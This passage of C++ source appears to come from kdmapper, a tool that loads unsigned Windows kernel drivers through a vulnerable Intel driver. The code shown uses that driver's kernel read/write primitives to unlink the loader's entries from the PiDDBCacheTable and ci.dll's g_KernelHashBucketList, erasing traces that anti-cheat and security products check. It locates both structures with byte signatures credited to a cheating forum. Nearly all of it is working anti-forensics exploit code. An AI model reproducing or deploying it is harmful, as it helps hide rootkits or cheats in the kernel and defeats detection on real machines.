	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);

	//context part is not used by lookup, lock or delete why we should use it?

	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		Log("[-] Can't lock PiDDBCacheTable");
		return false;
	}
	Log("[+] PiDDBLock Locked");

	auto n = GetDriverNameW();

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log("[-] Not found in cache");
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log("[-] Can't get prev entry");
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log("[-] Can't get next entry");
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	Log("[+] Found Table Entry = %p", pFoundEntry);

	if (!WriteMemory(device_handle, (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log("[-] Can't set next entry");
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	if (!WriteMemory(device_handle, (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log("[-] Can't set prev entry");
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		Log("[-] Can't delete from PiDDBCacheTable");
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	//Decrement delete count
	ULONG cacheDeleteCount = 0;
	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	// release the ddb resource lock
	ExReleaseResourceLite(device_handle, PiDDBLock);

	Log("[+] PiDDBCacheTable Cleaned");

	return true;
}

uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
	if (!dwAddress) {
		Log("[-] No module address to find pattern");
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		Log("[-] Can't find pattern, Too big section");
		return 0;
	}

	BYTE* sectionData = new BYTE[dwLen];
	if (!ReadMemory(device_handle, dwAddress, sectionData, dwLen)) {
		Log("[-] Read failed in FindPatternAtKernel");
		return 0;
	}

	auto result = kdmapper_utils::FindPattern((uintptr_t)sectionData, dwLen, bMask, szMask);

	if (result <= 0) {
		Log("[-] Can't find pattern");
		delete[] sectionData;
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData + result;
	delete[] sectionData;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
		Log("[-] Can't read module headers");
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmapper_utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		Log("[-] Can't find section");
		return 0;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, BYTE* bMask, char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	uint64_t ci = kdmapper_utils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		Log("[-] Can't Find ci.dll module address");
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), (char*)"xxx????x?xxxxxxx");
	if (!sig) {
		Log("[-] Can't Find g_KernelHashBucketList");
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), (char*)"xxx");
	if (!sig2) {
		Log("[-] Can't Find g_HashCacheLock");
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		Log("[-] Can't Find g_HashCache relative address");
		return false;
	}

	Log("[+] g_KernelHashBucketList Found %p", g_KernelHashBucketList);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		Log("[-] Can't lock g_HashCacheLock");
		return false;
	}
	Log("[+] g_HashCacheLock Locked");

	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		Log("[-] Failed to read first g_KernelHashBucketList entry!");
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log("[-] Failed to release g_KernelHashBucketList lock!");
		}
		return false;
	}
	if (!entry) {
		Log("[!] g_KernelHashBucketList looks empty!");
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log("[-] Failed to release g_KernelHashBucketList lock!");
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log("[-] Failed to read g_KernelHashBucketList entry text len!");
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log("[-] Failed to release g_KernelHashBucketList lock!");
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log("[-] Failed to read g_KernelHashBucketList entry text ptr!");
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log("[-] Failed to release g_KernelHashBucketList lock!");
				}
				return false;
			}

			wchar_t* wsName = new wchar_t[(ULONG64)wsNameLen / 2ULL + 1ULL];
			memset(wsName, 0, wsNameLen + sizeof(wchar_t));

			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen)) {
				Log("[-] Failed to read g_KernelHashBucketList entry text!");
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log("[-] Failed to release g_KernelHashBucketList lock!");
				}
				return false;
			}

			size_t find_result = std::wstring(wsName).find(wdname);
			if (find_result != std::wstring::npos) {
				Log("[+] Found In g_KernelHashBucketList: %ls", std::wstring(&wsName[find_result]));
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					Log("[-] Failed to read g_KernelHashBucketList next entry ptr!");
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log("[-] Failed to release g_KernelHashBucketList lock!");
					}
					return false;
				}

				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					Log("[-] Failed to write g_KernelHashBucketList prev entry ptr!");
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log("[-] Failed to release g_KernelHashBucketList lock!");
					}
					return false;
				}

				if (!FreePool(device_handle, (uintptr_t)entry)) {
					Log("[-] Failed to clear g_KernelHashBucketList entry pool!");
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log("[-] Failed to release g_KernelHashBucketList lock!");
					}
					return false;
				}
				Log("[+] g_KernelHashBucketList Cleaned");
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log("[-] Failed to release g_KernelHashBucketList lock!");
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log("[-] Failed to release g_KernelHashBucketList lock!");
					}
					return false;
				}
				delete[] wsName;
				return true;
			}
			delete[] wsName;
		}
		prev = entry;
		//read next
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			Log("[-] Failed to read g_KernelHashBucketList next entry!");
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log("[-] Failed to release g_KernelHashBucketList lock!");
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
		Log("[-] Failed to release g_KernelHashBucketList lock!");
	}
	return false;
}